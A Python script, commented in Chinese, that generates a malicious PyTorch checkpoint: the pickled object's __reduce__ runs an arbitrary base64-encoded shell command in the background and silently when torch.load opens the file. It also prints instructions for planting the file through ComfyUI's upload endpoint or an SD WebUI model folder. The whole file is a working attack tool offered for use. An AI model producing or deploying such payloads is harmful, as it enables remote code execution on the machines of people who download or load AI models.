#!/usr/bin/env python3
# mk_pickle.py v2 — 模型投毒载荷生成器（通杀 torch 全版本 zip 格式）
# 用法: python3 mk_pickle.py evil.ckpt '<任意 shell 命令>'
# 改进(v2):
#   - 命令 base64 内嵌 → 引号/管道/反斜杠全不破功
#   - __reduce__ 返回模块级函数 → 可正常 pickle（v1 传局部函数会炸）
#   - Popen 后台化 + 静默 → torch.load 不阻塞不报错
#   - zip 存储 + data/ 子目录 + version/byteorder（老 torch legacy 报 Invalid magic 的根因）
import zipfile, pickle, sys, base64

def make_zip(out, cmd):
    # base64 内嵌，命令引号/管道/反斜杠全不破功
    b = base64.b64encode(cmd.encode()).decode()
    # 用模块级 os.system（pickle 需在目标环境可检索）+ python base64 解码
    #     后台 & 化避免 torch.load 被阻塞
    sufx = " &" if not cmd.rstrip().endswith("&") else ""
    inner = "python3 -c \"import os,base64;os.system(base64.b64decode('%s').decode()+%s)\"" % (b, repr(sufx))
    class Evil:
        def __reduce__(self):
            import os
            return (os.system, (inner,))
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("data/data.pkl", pickle.dumps(Evil(), protocol=2))
        z.writestr("data/version", "3")
        z.writestr("data/byteorder", "little")
    print(f"[+] payload written: {out}  cmd={cmd[:50]}...")

def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    make_zip(sys.argv[1], sys.argv[2])
    print("    ComfyUI: POST /upload/image (subfolder=checkpoints,type=output,overwrite=true)")
    print("    SD WebUI: 放 models/Stable-diffusion/ 后加载该模型")
    print("    验证: python3 -c \"import zipfile,pickle;z=zipfile.ZipFile(sys.argv[1]);pickle.loads(z.read('data/data.pkl'))\" <file>")

if __name__ == "__main__":
    main()
